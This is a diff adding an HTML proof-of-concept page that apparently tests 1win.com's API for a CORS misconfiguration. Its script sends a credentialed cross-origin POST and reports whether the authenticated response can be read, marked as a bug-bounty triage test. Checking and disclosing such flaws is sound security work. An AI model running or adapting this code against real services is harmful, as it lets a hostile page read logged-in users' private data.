@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<body>
+<pre id="out">Running...</pre>
+<script>
+fetch('https://1win.com/api/v1/product-visits', {
+  method: 'POST',
+  credentials: 'include',
+  mode: 'cors',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({
+    partnerHash: 'BOUNTY_TRIAGE_TEST',
+    landingId: 'casino'
+  })
+})
+.then(r => r.json())
+.then(d => {
+  document.getElementById('out').textContent =
+    'VULNERABLE — Response readable cross-origin:\n' + JSON.stringify(d, null, 2);
+})
+.catch(e => {
+  document.getElementById('out').textContent = 'BLOCKED: ' + e;
+});
+</script>
+</body>
+</html>
